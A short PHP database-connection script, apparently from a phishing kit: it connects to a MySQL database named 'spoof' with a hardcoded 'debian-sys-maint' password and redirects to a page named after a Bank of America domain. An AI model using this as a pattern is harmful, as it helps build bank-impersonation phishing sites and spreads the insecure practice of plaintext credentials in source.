<?php
	session_start();
	$server = "127.0.0.1";
	$username = "debian-sys-maint";
	$password = "5EB0SFQgoKH3KZ8p";
	$database = "spoof";

	try{
		$conn = new PDO("mysql:host=$server;dbname=$database",$username,$password);
		$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
		print_r("Success");
	} catch (PDOException $e) {
		print_r("Failure");
		header("Location: secure.bankofamerica.com.php");
		exit;
	}
?>